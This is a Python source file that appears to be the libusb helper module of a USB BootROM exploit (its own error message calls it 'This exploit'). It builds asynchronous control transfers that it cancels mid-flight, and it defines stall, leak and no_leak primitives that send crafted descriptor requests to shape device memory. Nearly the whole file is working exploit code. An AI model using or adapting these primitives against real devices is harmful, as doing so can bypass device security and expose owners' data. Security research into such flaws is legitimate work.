import array
import ctypes
import struct
import sys
import time
from contextlib import suppress
from typing import TYPE_CHECKING, Any, Union

import usb  # type: ignore

if TYPE_CHECKING:
    from usb.core import Device  # type: ignore


# Must be global so garbage collector never frees it
request = None
transfer_ptr = None
never_free_device = None


def libusb1_create_ctrl_transfer(device: "Device", request: Any, timeout: int):
    assert usb.backend.libusb1._lib

    ptr = usb.backend.libusb1._lib.libusb_alloc_transfer(0)
    assert ptr is not None

    transfer = ptr.contents
    transfer.dev_handle = device._ctx.handle.handle
    transfer.endpoint = 0  # EP0
    transfer.type = 0  # LIBUSB_TRANSFER_TYPE_CONTROL
    transfer.timeout = timeout
    transfer.buffer = request.buffer_info()[0]  # C-pointer to request buffer
    transfer.length = len(request)
    transfer.user_data = None
    transfer.callback = usb.backend.libusb1._libusb_transfer_cb_fn_p(0)  # NULL
    transfer.flags = 1 << 1  # LIBUSB_TRANSFER_FREE_BUFFER

    return ptr


def libusb1_async_ctrl_transfer(
    device: "Device",
    bm_request_type: int,
    b_request: int,
    w_value: int,
    w_index: int,
    data: bytes,
    timeout: float,
) -> None:
    if usb.backend.libusb1._lib is not device._ctx.backend.lib:
        print(
            "ERROR: This exploit requires libusb1 backend, but another backend is being used. Exiting."
        )
        sys.exit(1)

    global request, transfer_ptr, never_free_device
    request_timeout = int(timeout) if timeout >= 1 else 0
    start = time.time()
    never_free_device = device
    request = array.array(
        "B",
        struct.pack("<BBHHH", bm_request_type, b_request, w_value, w_index, len(data))
        + data,
    )
    transfer_ptr = libusb1_create_ctrl_transfer(device, request, request_timeout)
    assert usb.backend.libusb1._lib.libusb_submit_transfer(transfer_ptr) == 0

    while time.time() - start < timeout / 1000.0:
        pass

    # Prototype of libusb_cancel_transfer is missing from pyusb
    usb.backend.libusb1._lib.libusb_cancel_transfer.argtypes = [
        ctypes.POINTER(usb.backend.libusb1._libusb_transfer)
    ]
    assert usb.backend.libusb1._lib.libusb_cancel_transfer(transfer_ptr) == 0


def libusb1_no_error_ctrl_transfer(
    device: "Device",
    bm_request_type: int,
    b_request: int,
    w_value: int,
    w_index: int,
    data_or_w_length: Union[int, bytes],
    timeout: int,
) -> None:
    with suppress(usb.core.USBError):
        device.ctrl_transfer(
            bm_request_type, b_request, w_value, w_index, data_or_w_length, timeout
        )


def stall(device: "Device", no_error: bool = False) -> None:
    if no_error:
        libusb1_no_error_ctrl_transfer(device, 0x2, 3, 0x0, 0x80, 0x0, 10)
    else:
        libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, b"A" * 0xC0, 0.00001)


def leak(device: "Device", no_error: bool = False):
    if no_error:
        libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x40, 1)
    else:
        libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)


def no_leak(device: "Device", no_error: bool = False) -> None:
    if no_error:
        libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0x41, 1)
    else:
        libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
